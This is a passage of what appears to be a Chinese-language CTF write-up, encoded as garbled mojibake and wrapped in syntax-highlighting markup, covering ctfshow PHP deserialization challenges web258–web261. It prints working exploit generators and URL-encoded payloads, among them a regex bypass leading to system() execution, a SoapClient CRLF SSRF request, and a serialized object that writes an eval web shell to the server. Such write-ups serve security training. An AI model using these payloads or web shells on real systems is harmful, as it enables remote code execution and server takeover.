class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å¤šäº†æ­£åˆ™è¿‡æ»¤<code>/[oc]:\d+:/i</code> è¿˜æœ‰ä¸ªå°æ”¹åŠ¨ï¼Œ<strong>æŠŠåŸæ¥çš„privateæ”¹æˆäº†public</strong></p><p>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼<code>&#39;/[oc]:\d+:/i&#39;</code>å¯ä»¥åˆ†è§£ä¸ºå‡ ä¸ªéƒ¨åˆ†æ¥è§£é‡Šï¼š</p><ol><li><code>/</code>ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸé€šå¸¸ä½¿ç”¨æ–œæ <code>/</code>æ¥æ ‡è®°ï¼Œä½†åœ¨å­—ç¬¦ä¸²ä¸­ä½¿ç”¨æ—¶ï¼Œéœ€è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦<code>\</code>æ¥é¿å…ä¸å­—ç¬¦ä¸²çš„ç»“æŸæ ‡è®°æ··æ·†ã€‚</li><li><code>[oc]</code>ï¼šè¿™æ˜¯ä¸€ä¸ªå­—ç¬¦é›†ï¼Œè¡¨ç¤ºåŒ¹é…æ–¹æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒå¯ä»¥åŒ¹é…å­—æ¯<code>o</code>æˆ–<code>c</code>ã€‚</li><li><code>:</code>ï¼šè¿™ä¸ªå­—ç¬¦å­—é¢ä¸Šè¡¨ç¤ºå®ƒè‡ªå·±ï¼Œå³å†’å·ã€‚</li><li><code>\d+</code>ï¼š<code>\d</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä»£è¡¨ä»»æ„ä¸€ä¸ªæ•°å­—ï¼ˆ0-9ï¼‰ã€‚<code>+</code>æ˜¯ä¸€ä¸ªé‡è¯ï¼Œè¡¨ç¤ºå‰é¢çš„å­—ç¬¦æˆ–å­—ç¬¦é›†å¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚æ‰€ä»¥<code>\d+</code>è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ã€‚</li><li><code>:</code>ï¼šåŒä¸Šï¼Œè¡¨ç¤ºå­—é¢ä¸Šçš„å†’å·ã€‚</li><li><code>/i</code>ï¼š<code>i</code>æ˜¯ä¸€ä¸ªä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ã€‚è¿™æ„å‘³ç€<code>[oc]</code>å¯ä»¥åŒ¹é…<code>O</code>æˆ–<code>o</code>æˆ–<code>C</code>æˆ–<code>c</code>ã€‚</li></ol><p>å°†è¿™äº›éƒ¨åˆ†ç»„åˆèµ·æ¥ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯ä»¥åŒ¹é…å½¢å¦‚<code>/o123:</code>æˆ–<code>/c456:</code>çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­<code>o</code>æˆ–<code>c</code>åé¢è·Ÿç€ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ï¼Œç„¶åæ˜¯ä¸€ä¸ªå†’å·ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥åŒ¹é…<code>/oc:12345/</code>æˆ–<code>/O987:</code>ã€‚</p><p>å¯ä»¥åˆ©ç”¨unserializeçš„ç‰¹æ€§åœ¨æ•°å­—å‰é¢åŠ ä¸Š <code>+</code> å³å¯ï¼Œè¿™é‡Œæ­£åˆ™æ›¿æ¢ä¸€ä¸‹ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("tac fl*");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([oc]):(\d+:)/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$1</span></span>:+<span class="token interpolation"><span class="token variable">$2</span></span>"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span>fl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:+11:"ctfShowUser":1:&#123;s:5:"class";O:+8:"backDoor":1:&#123;s:4:"code";s:18:"system("tac fl*");";&#125;&#125;</span></code></pre><h4 id="web259-HTTP-SoapClient-CRLF-SSRF"><a href="#web259-HTTP-SoapClient-CRLF-SSRF" class="headerlink" title="web259(HTTP  SoapClient+CRLF+SSRF)"></a>web259(HTTP  SoapClient+CRLF+SSRF)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">.</span><span class="token class-name type-declaration">php</span><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ²¡æ‰¾åˆ°å¯ä»¥ååºåˆ—åŒ–çš„ç±»ï¼Œä½†æ˜¯æ ¹æ®æç¤ºä¼ªé€ ipåè®¿é—®flag.txtå¯ä»¥å¾—åˆ°flagï¼Œæ„Ÿè§‰è€ƒçš„æ˜¯HTTP</p><p>çœ‹äº†å¤§ä½¬wpè€ƒçš„æ˜¯phpåŸç”Ÿç±»<code>SoapClient</code>+<code>CRLF</code>å®ç°<code>SSRF</code></p><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">ä»ä¸€é“é¢˜å­¦ä¹ SoapClientä¸CRLFç»„åˆæ‹³</a></p><p><strong>CRLFæ³¨å…¥æ”»å‡»</strong></p><p>CRLFæ˜¯â€œå›è½¦+æ¢è¡Œâ€ï¼ˆ\r\nï¼‰çš„ç®€ç§°ï¼Œå…¶åå…­è¿›åˆ¶ç¼–ç åˆ†åˆ«ä¸º0x0då’Œ0x0aã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTP headerä¸HTTP Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†</p><p>éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTPå†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œ</p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ã€‚CRLFæ¼æ´å¸¸å‡ºç°åœ¨Locationä¸Set-cookieæ¶ˆæ¯å¤´ä¸­ã€‚</p><p><strong>æœ¬é¢˜éœ€è¦é‡ç‚¹å…³æ³¨çš„ææ„å‡½æ•°</strong></p><p><code>__call</code> åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨<br>åœ¨è¿™é“é¢˜ä¸­<code>$vip-&gt;getFlag();</code>å› ä¸ºè°ƒç”¨äº†ç±»ä¸­æ²¡æœ‰çš„æ–¹æ³•æ‰€ä»¥ä¼šå¯¼è‡´<code>__call</code>çš„æ‰§è¡Œ<br>æœ¬é¢˜éœ€è¦ç”¨åˆ°çš„å‡½æ•°<br><a href="https://www.php.net/manual/zh/soapclient.call.php">SoapClient::__call</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'hsad^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"ssrf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h4 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åºåˆ—åŒ–å‡ºæ¥çš„ä¸œè¥¿éœ€è¦åŒ…å«å­—ç¬¦ä¸²ctfshow_i_love_36Dï¼Œ<br>ç›´æ¥ä¼ ctfhsow&#x3D;ctfshow_i_love_36Dè¯•è¯•ï¼ŒæˆåŠŸå›æ˜¾flagã€‚</p><h4 id="web261-unserialize"><a href="#web261-unserialize" class="headerlink" title="web261(__unserialize)"></a>web261(__unserialize)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#language.oop5.magic.sleep">PHP æ–‡æ¡£</a>ä¸­æåˆ°</p><blockquote><p>æ³¨æ„:<br>å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº†<code> __unserialize()</code> å’Œ <code>__wakeup()</code> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ <code>__unserialize()</code> æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ<code>__wakeup() </code>æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚<br>æ³¨æ„:<br>æ­¤ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨ã€‚</p></blockquote><p>æŸ¥çœ‹ <code>response header</code> å¯çŸ¥ <code>X-Powered-By: PHP/7.4.16</code>ï¼Œé‚£ä¹ˆ <code>__wakeup</code> éƒ¨åˆ†å°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œä¸æ³¨é‡Šæ— å¼‚ã€‚<br><code>__destruct</code> å‡½æ•°éƒ¨åˆ†å¼±æ¯”è¾ƒ <code>$this-&gt;code==0x36d</code>ï¼Œå› ä¸º <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>ï¼Œ<code>username</code> å¯æ§åˆ¶ï¼Œå› ä¸º <code>(int)&#39;877.php&#39; == 0x36d</code>ï¼Œæ•…ä¼  <code>877.php</code> å³å¯ç»•è¿‡ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>vip<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowvip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22877.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token operator">%</span><span class="token number">40</span>eval<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B1<span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token 